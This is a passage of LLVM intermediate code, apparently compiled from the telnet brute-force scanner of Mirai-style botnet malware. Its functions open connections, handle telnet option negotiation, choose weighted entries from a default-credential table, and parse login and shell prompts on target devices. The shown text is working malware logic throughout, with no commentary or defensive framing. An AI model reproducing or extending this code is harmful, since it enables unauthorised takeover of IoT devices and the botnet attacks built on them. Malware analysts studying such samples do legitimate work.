  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 3
  store i32 %58, i32* %60, align 4
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 16
  store i32 1, i32* %62, align 8
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i32 0, i32 2
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 %65, %struct.sockaddr* %69, i32 16)
  br label %71

71:                                               ; preds = %33, %22
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

9:                                                ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %46

13:                                               ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  br label %43

25:                                               ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

36:                                               ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %47

41:                                               ; preds = %25
  br label %42

42:                                               ; preds = %41
  br label %43

43:                                               ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %2, align 4
  br label %9, !llvm.loop !18

46:                                               ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %47

47:                                               ; preds = %46, %36
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %48
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_iacs(%struct.scanner_connection* %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  store i8* %10, i8** %4, align 8
  br label %11

11:                                               ; preds = %136, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 4
  %15 = load i32, i32* %14, align 8
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %137

17:                                               ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

22:                                               ; preds = %17
  br label %137

23:                                               ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %135

28:                                               ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

33:                                               ; preds = %28
  br label %137

34:                                               ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %45

40:                                               ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add nsw i32 %43, 2
  store i32 %44, i32* %3, align 4
  br label %11, !llvm.loop !19

45:                                               ; preds = %34
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  br i1 %50, label %51, label %81

51:                                               ; preds = %45
  %52 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %52, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.consume_iacs.tmp1, i32 0, i32 0), i64 3, i1 false)
  %53 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %53, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.consume_iacs.tmp2, i32 0, i32 0), i64 9, i1 false)
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = load i8*, i8** %4, align 8
  %56 = call signext i8 @can_consume(%struct.scanner_connection* %54, i8* %55, i32 2)
  %57 = icmp ne i8 %56, 0
  br i1 %57, label %59, label %58

58:                                               ; preds = %51
  br label %137

59:                                               ; preds = %51
  %60 = load i8*, i8** %4, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 31
  br i1 %64, label %65, label %66

65:                                               ; preds = %59
  br label %82

66:                                               ; preds = %59
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 3
  store i8* %68, i8** %4, align 8
  %69 = load i32, i32* %3, align 4
  %70 = add nsw i32 %69, 3
  store i32 %70, i32* %3, align 4
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 2
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i64 0, i64 0
  %75 = call i64 @send(i32 %73, i8* %74, i64 3, i32 16384)
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 2
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %80 = call i64 @send(i32 %78, i8* %79, i64 9, i32 16384)
  br label %133

81:                                               ; preds = %45
  br label %82

82:                                               ; preds = %81, %65
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call signext i8 @can_consume(%struct.scanner_connection* %83, i8* %84, i32 2)
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %88, label %87

87:                                               ; preds = %82
  br label %137

88:                                               ; preds = %82
  store i32 0, i32* %5, align 4
  br label %89

89:                                               ; preds = %120, %88
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 3
  br i1 %91, label %92, label %123

92:                                               ; preds = %89
  %93 = load i8*, i8** %4, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 253
  br i1 %99, label %100, label %105

100:                                              ; preds = %92
  %101 = load i8*, i8** %4, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  store i8 -4, i8* %104, align 1
  br label %119

105:                                              ; preds = %92
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 251
  br i1 %112, label %113, label %118

113:                                              ; preds = %105
  %114 = load i8*, i8** %4, align 8
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  store i8 -3, i8* %117, align 1
  br label %118

118:                                              ; preds = %113, %105
  br label %119

119:                                              ; preds = %118, %100
  br label %120

120:                                              ; preds = %119
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  br label %89, !llvm.loop !20

123:                                              ; preds = %89
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 2
  %126 = load i32, i32* %125, align 8
  %127 = load i8*, i8** %4, align 8
  %128 = call i64 @send(i32 %126, i8* %127, i64 3, i32 16384)
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 3
  store i8* %130, i8** %4, align 8
  %131 = load i32, i32* %3, align 4
  %132 = add nsw i32 %131, 3
  store i32 %132, i32* %3, align 4
  br label %133

133:                                              ; preds = %123, %66
  br label %134

134:                                              ; preds = %133
  br label %135

135:                                              ; preds = %134, %23
  br label %136

136:                                              ; preds = %135
  br label %11, !llvm.loop !19

137:                                              ; preds = %87, %58, %33, %22, %11
  %138 = load i32, i32* %3, align 4
  ret i32 %138
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_login_prompt(%struct.scanner_connection* %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 -1, i32* %8, align 4
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = sub nsw i32 %11, 1
  store i32 %12, i32* %6, align 4
  br label %13

13:                                               ; preds = %68, %2
  %14 = load i32, i32* %6, align 4
  %15 = icmp sgt i32 %14, 0
  br i1 %15, label %16, label %71

16:                                               ; preds = %13
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = load i32, i32* %6, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = sext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  br i1 %24, label %64, label %25

25:                                               ; preds = %16
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %6, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  br i1 %33, label %64, label %34

34:                                               ; preds = %25
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = load i32, i32* %6, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %36, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 36
  br i1 %42, label %64, label %43

43:                                               ; preds = %34
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 35
  br i1 %51, label %64, label %52

52:                                               ; preds = %43
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 37
  br i1 %60, label %61, label %67

61:                                               ; preds = %52
  %62 = load i32, i32* %5, align 4
  %63 = icmp eq i32 %62, 1
  br i1 %63, label %64, label %67

64:                                               ; preds = %61, %43, %34, %25, %16
  %65 = load i32, i32* %6, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %8, align 4
  br label %71

67:                                               ; preds = %61, %52
  br label %68

68:                                               ; preds = %67
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, -1
  store i32 %70, i32* %6, align 4
  br label %13, !llvm.loop !21

71:                                               ; preds = %64, %13
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %126

74:                                               ; preds = %71
  %75 = load i32, i32* %5, align 4
  %76 = icmp eq i32 %75, 1
  br i1 %76, label %77, label %113

77:                                               ; preds = %74
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 7
  %80 = getelementptr inbounds [8192 x i8], [8192 x i8]* %79, i64 0, i64 0
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 4
  %83 = load i32, i32* %82, align 8
  %84 = call i32 @util_memsearch(i8* %80, i32 %83, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i64 0, i64 0), i32 4)
  store i32 %84, i32* %7, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %88

86:                                               ; preds = %77
  %87 = load i32, i32* %7, align 4
  store i32 %87, i32* %8, align 4
  br label %112

88:                                               ; preds = %77
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 7
  %91 = getelementptr inbounds [8192 x i8], [8192 x i8]* %90, i64 0, i64 0
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 4
  %94 = load i32, i32* %93, align 8
  %95 = call i32 @util_memsearch(i8* %91, i32 %94, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i64 0, i64 0), i32 5)
  store i32 %95, i32* %7, align 4
  %96 = icmp ne i32 %95, -1
  br i1 %96, label %97, label %99

97:                                               ; preds = %88
  %98 = load i32, i32* %7, align 4
  store i32 %98, i32* %8, align 4
  br label %111

99:                                               ; preds = %88
  %100 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %101 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %100, i32 0, i32 7
  %102 = getelementptr inbounds [8192 x i8], [8192 x i8]* %101, i64 0, i64 0
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 4
  %105 = load i32, i32* %104, align 8
  %106 = call i32 @util_memsearch(i8* %102, i32 %105, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i64 0, i64 0), i32 3)
  store i32 %106, i32* %7, align 4
  %107 = icmp ne i32 %106, -1
  br i1 %107, label %108, label %110

108:                                              ; preds = %99
  %109 = load i32, i32* %7, align 4
  store i32 %109, i32* %8, align 4
  br label %110

110:                                              ; preds = %108, %99
  br label %111

111:                                              ; preds = %110, %97
  br label %112

112:                                              ; preds = %111, %86
  br label %125

113:                                              ; preds = %74
  %114 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %114, i32 0, i32 7
  %116 = getelementptr inbounds [8192 x i8], [8192 x i8]* %115, i64 0, i64 0
  %117 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %117, i32 0, i32 4
  %119 = load i32, i32* %118, align 8
  %120 = call i32 @util_memsearch(i8* %116, i32 %119, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i64 0, i64 0), i32 7)
  store i32 %120, i32* %7, align 4
  %121 = icmp ne i32 %120, -1
  br i1 %121, label %122, label %124

122:                                              ; preds = %113
  %123 = load i32, i32* %7, align 4
  store i32 %123, i32* %8, align 4
  br label %124

124:                                              ; preds = %122, %113
  br label %125

125:                                              ; preds = %124, %112
  br label %126

126:                                              ; preds = %125, %71
  %127 = load i32, i32* %8, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %130

129:                                              ; preds = %126
  store i32 0, i32* %3, align 4
  br label %132

130:                                              ; preds = %126
  %131 = load i32, i32* %8, align 4
  store i32 %131, i32* %3, align 4
  br label %132

132:                                              ; preds = %130, %129
  %133 = load i32, i32* %3, align 4
  ret i32 %133
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_shell_prompt(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %5, align 4
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 7
  %8 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @util_memsearch(i8* %8, i32 %11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i64 0, i64 0), i32 8)
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %14, label %15

14:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %147

15:                                               ; preds = %1
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @util_memsearch(i8* %18, i32 %21, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i64 0, i64 0), i32 6)
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %15
  store i32 -1, i32* %2, align 4
  br label %147

25:                                               ; preds = %15
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i64 0, i64 0
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 4
  %31 = load i32, i32* %30, align 8
  %32 = call i32 @util_memsearch(i8* %28, i32 %31, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i64 0, i64 0), i32 9)
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %35

34:                                               ; preds = %25
  store i32 -1, i32* %2, align 4
  br label %147

35:                                               ; preds = %25
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i64 0, i64 0
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = call i32 @util_memsearch(i8* %38, i32 %41, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i64 0, i64 0), i32 14)
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %35
  store i32 -1, i32* %2, align 4
  br label %147

45:                                               ; preds = %35
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %47, i64 0, i64 0
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 4
  %51 = load i32, i32* %50, align 8
  %52 = call i32 @util_memsearch(i8* %48, i32 %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i64 0, i64 0), i32 5)
  %53 = icmp ne i32 %52, -1
  br i1 %53, label %54, label %55

54:                                               ; preds = %45
  store i32 -1, i32* %2, align 4
  br label %147

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %55
  br label %57

57:                                               ; preds = %56
  br label %58

58:                                               ; preds = %57
  br label %59

59:                                               ; preds = %58
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 4
  %62 = load i32, i32* %61, align 8
  %63 = sub nsw i32 %62, 1
  store i32 %63, i32* %4, align 4
  br label %64

64:                                               ; preds = %134, %59
  %65 = load i32, i32* %4, align 4
  %66 = icmp sgt i32 %65, 0
  br i1 %66, label %67, label %137

67:                                               ; preds = %64
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 7
  %70 = load i32, i32* %4, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %69, i64 0, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 58
  br i1 %75, label %130, label %76

76:                                               ; preds = %67
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 7
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i64 0, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 62
  br i1 %84, label %130, label %85

85:                                               ; preds = %76
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 7
  %88 = load i32, i32* %4, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [8192 x i8], [8192 x i8]* %87, i64 0, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 36
  br i1 %93, label %130, label %94

94:                                               ; preds = %85
  %95 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %96 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %95, i32 0, i32 7
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [8192 x i8], [8192 x i8]* %96, i64 0, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = icmp eq i32 %101, 35
  br i1 %102, label %130, label %103

103:                                              ; preds = %94
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = load i32, i32* %4, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [8192 x i8], [8192 x i8]* %105, i64 0, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %110, 37
  br i1 %111, label %130, label %112

112:                                              ; preds = %103
  %113 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %114 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %113, i32 0, i32 7
  %115 = load i32, i32* %4, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [8192 x i8], [8192 x i8]* %114, i64 0, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = sext i8 %118 to i32
  %120 = icmp eq i32 %119, 93
  br i1 %120, label %130, label %121

121:                                              ; preds = %112
  %122 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %122, i32 0, i32 7
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [8192 x i8], [8192 x i8]* %123, i64 0, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = sext i8 %127 to i32
  %129 = icmp eq i32 %128, 126
  br i1 %129, label %130, label %133

130:                                              ; preds = %121, %112, %103, %94, %85, %76, %67
  %131 = load i32, i32* %4, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %5, align 4
  br label %137

133:                                              ; preds = %121
  br label %134

134:                                              ; preds = %133
  %135 = load i32, i32* %4, align 4
  %136 = add nsw i32 %135, -1
  store i32 %136, i32* %4, align 4
  br label %64, !llvm.loop !22

137:                                              ; preds = %130, %64
  %138 = load i32, i32* %5, align 4
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %137
  store i32 1, i32* %5, align 4
  br label %141

141:                                              ; preds = %140, %137
  %142 = load i32, i32* %5, align 4
  %143 = icmp eq i32 %142, -1
  br i1 %143, label %144, label %145

144:                                              ; preds = %141
  store i32 0, i32* %2, align 4
  br label %147

145:                                              ; preds = %141
  %146 = load i32, i32* %5, align 4
  store i32 %146, i32* %2, align 4
  br label %147

147:                                              ; preds = %145, %144, %54, %44, %34, %24, %14
  %148 = load i32, i32* %2, align 4
  ret i32 %148
}

declare void @table_unlock_val(i8 zeroext) #1

declare i8* @table_retrieve_val(i32, i32*) #1

declare void @table_lock_val(i8 zeroext) #1

